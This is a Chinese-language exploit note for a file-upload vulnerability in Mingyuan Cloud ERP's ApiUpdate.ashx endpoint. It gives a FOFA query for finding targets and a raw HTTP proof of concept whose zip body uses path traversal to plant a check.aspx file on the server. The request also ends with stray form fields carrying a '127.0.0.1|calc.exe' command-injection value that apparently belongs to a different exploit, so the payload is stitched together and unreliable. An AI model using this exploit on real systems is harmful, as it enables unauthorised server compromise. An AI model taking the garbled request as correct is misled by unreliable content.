## 明源云ERP接口ApiUpdate.ashx文件上传漏洞

## fofa

```javascript
body="hibot.js" || title="明源云ERP"
```

## poc

```javascript
POST /myunke/ApiUpdateTool/ApiUpdate.ashx?apiocode=a HTTP/1.1
Host: target.com
Accept-Encoding: gzip
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3)AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Content-Length: 856

{{unquote("PK\x03\x04\x14\x00\x00\x00\x08\x00\xf2\x9a\x0bW\x97\xe9\x8br\x8c\x00\x00\x00\x93\x00\x00\x00\x1e\x00\x00\x00../../../fdccloud/_/check.aspx$\xcc\xcb\x0a\xc20\x14\x04\xd0_\x09\x91B\xbb\x09\x0a\xddH\xab\x29\x8aP\xf0QZ\xc4\xf5m\x18j!ib\x1e\x82\x7fo\xc4\xdd0g\x98:\xdb\xb1\x96F\xb03\xcdcLa\xc3\x0f\x0b\xce\xb2m\x9d\xa0\xd1\xd6\xb8\xc0\xae\xa4\xe1-\xc9d\xfd\xc7\x07h\xd1\xdc\xfe\x13\xd6%0\xb3\x87x\xb8\x28\xe7R\x96\xcbr5\xacyQ\x9d&\x05q\x84B\xea\x7b\xb87\x9c\xb8\x90m\x28<\xf3\x0e\xaf\x08\x1f\xc4\xdd\x28\xb1\x1f\xbcQ1\xe0\x07EQ\xa5\xdb/\x00\x00\x00\xff\xff\x03\x00PK\x01\x02\x14\x03\x14\x00\x00\x00\x08\x00\xf2\x9a\x0bW\x97\xe9\x8br\x8c\x00\x00\x00\x93\x00\x00\x00\x1e\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00../../../fdccloud/_/check.aspxPK\x05\x06\x00\x00\x00\x00\x01\x00\x01\x00L\x00\x00\x00\xc8\x00\x00\x00\x00\x00")}}
vsoft=kvm&hostType=physical&name=penson&extranet=127.0.0.1%7Ccalc.exe&cpuCores=2&
memory=16&diskSize=16&desc=&uid=640be59da4851&type=za
```

